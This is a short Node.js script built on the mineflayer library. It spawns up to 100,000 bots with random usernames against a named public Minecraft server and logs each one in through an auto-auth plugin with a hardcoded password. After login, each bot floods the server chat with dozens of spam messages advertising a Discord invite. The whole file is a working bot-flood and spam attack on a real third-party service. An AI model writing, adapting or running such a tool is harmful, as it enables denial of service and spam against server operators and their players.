const mineflayer = require('mineflayer')
const { setTimeout } = require('timers')
var crypto = require("crypto");
var AutoAuth = require('mineflayer-auto-auth')

const Bot = class {
    constructor(username) {
        const bot = mineflayer.createBot({
            plugins: [AutoAuth], 
            username: `${username}`,
            AutoAuth: {logging: true, password: 'OowoO777+', ignoreRepeat: true},
            version: '1.8.9',
            host: 'play.chilitocrafters.com',
            viewDistance: 'tiny',
            port: '25565',
            verbose: true,
        });
        
        //logs
        bot.on('error', (err) => {    //Parts of the code belong to https://github.com/Its-Vichy
            console.log(err)
        });

        bot.on('kicked', (err) => {
            console.log(err)
        });
        
        bot.on('serverAuth', function () {
            for (var i = 3; i < 100; i++) {
                setTimeout(() => {
                    bot.chat(`Spam by .gg/xxxxx >${crypto.randomBytes(6).toString('hex')}<`);
                }, 500)
            }
        });
    }
};


let i = 0
function next() {
    if (i < 100000) {
        i++
        setTimeout(() => {
            new Bot(crypto.randomBytes(8).toString('hex'));
            next()
        }, 1000)
    }
}
next()
